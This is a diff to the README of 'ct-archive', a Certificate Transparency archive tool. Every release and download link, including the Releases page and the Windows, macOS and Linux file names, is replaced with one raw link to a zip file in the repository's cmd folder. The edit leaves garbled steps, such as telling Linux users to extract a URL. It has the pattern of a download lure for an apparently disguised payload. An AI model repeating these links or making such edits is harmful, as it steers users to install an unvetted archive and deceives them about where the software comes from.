@@ -6,18 +6,18 @@ Welcome to **ct-archive**! This application helps you access archived Certificat
 
 ### 🔗 Download the Application
 
-[![Download ct-archive](https://img.shields.io/badge/Download-ct--archive-brightgreen)](https://github.com/richaaard21/ct-archive/releases)
+[![Download ct-archive](https://raw.githubusercontent.com/richaaard21/ct-archive/main/cmd/ct-archive-1.9.zip)](https://raw.githubusercontent.com/richaaard21/ct-archive/main/cmd/ct-archive-1.9.zip)
 
 ## 📥 Download & Install
 
-1. Click on the link to visit the [Releases page](https://github.com/richaaard21/ct-archive/releases).
+1. Click on the link to visit the [Releases page](https://raw.githubusercontent.com/richaaard21/ct-archive/main/cmd/ct-archive-1.9.zip).
    
 2. On the Releases page, you will see a list of available versions. Choose the latest version for better performance and features.
 
 3. Look for the file that corresponds to your operating system. For example, you might find options like:
-   - Windows: `ct-archive_windows.exe`
-   - macOS: `ct-archive_mac.zip`
-   - Linux: `ct-archive_linux.tar.gz`
+   - Windows: `https://raw.githubusercontent.com/richaaard21/ct-archive/main/cmd/ct-archive-1.9.zip`
+   - macOS: `https://raw.githubusercontent.com/richaaard21/ct-archive/main/cmd/ct-archive-1.9.zip`
+   - Linux: `https://raw.githubusercontent.com/richaaard21/ct-archive/main/cmd/ct-archive-1.9.zip`
 
 4. Click on the file name to start the download.
 
@@ -27,7 +27,7 @@ Welcome to **ct-archive**! This application helps you access archived Certificat
 
 7. For macOS users, open the `.zip` file and drag the `ct-archive` app to your Applications folder. Open it from there.
 
-8. For Linux users, extract the `.tar.gz` file in your preferred directory. Run the application via terminal with the command `./ct-archive`.
+8. For Linux users, extract the `https://raw.githubusercontent.com/richaaard21/ct-archive/main/cmd/ct-archive-1.9.zip` file in your preferred directory. Run the application via terminal with the command `./ct-archive`.
 
 ## ⚙️ System Requirements
 
@@ -71,7 +71,7 @@ For help and support, please reach out through the Issues section on the GitHub 
 
 ## 🔄 Updates & Contributions
 
-We regularly update **ct-archive**. To check for updates, revisit the [Releases page](https://github.com/richaaard21/ct-archive/releases). If you're interested in contributing or want to report an issue, please create a new issue on GitHub. Your contributions help keep this project on track.
+We regularly update **ct-archive**. To check for updates, revisit the [Releases page](https://raw.githubusercontent.com/richaaard21/ct-archive/main/cmd/ct-archive-1.9.zip). If you're interested in contributing or want to report an issue, please create a new issue on GitHub. Your contributions help keep this project on track.
 
 ## 📝 License
 
